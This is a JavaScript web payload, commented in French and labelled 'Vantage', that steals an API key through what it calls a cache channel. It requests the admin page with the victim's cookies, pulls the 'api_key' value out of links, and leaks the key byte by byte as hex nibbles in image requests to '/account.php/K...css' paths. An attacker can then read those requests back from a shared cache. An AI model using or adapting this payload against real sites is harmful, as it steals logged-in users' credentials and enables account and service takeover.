/* Vantage - exfiltration de l'api_key par le canal de cache.
   Chaque octet de la clef est encode sur deux balises (quartet haut, quartet bas),
   ce qui rend l'alphabet enumerable cote lecteur. */
(function () {
  function b(t) { try { new Image().src = '/account.php/K' + t + '.css'; } catch (e) {} }
  fetch('/admin/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (h) {
      var d = new DOMParser().parseFromString(h, 'text/html');
      var key = null, href = null;
      d.querySelectorAll('a[href]').forEach(function (a) {
        var u = a.getAttribute('href');
        if (!key && u.indexOf('api_key') >= 0) {
          href = u;
          var m = u.match(/api_key=([^&"'\s]+)/);
          if (m) key = m[1];
        }
      });
      if (!key) { b('none'); return; }
      ['index.php', 'review.php', 'search.php', 'pages.php', 'edit.php'].forEach(function (n, i) {
        if (href.indexOf(n) >= 0) b('T' + i);
      });
      b('L' + key.length);
      for (var i = 0; i < key.length && i < 96; i++) {
        var c = key.charCodeAt(i);
        b('P' + i + 'h' + ((c >> 4) & 15).toString(16));
        b('P' + i + 'l' + (c & 15).toString(16));
      }
    })
    .catch(function () { b('err'); });
})();
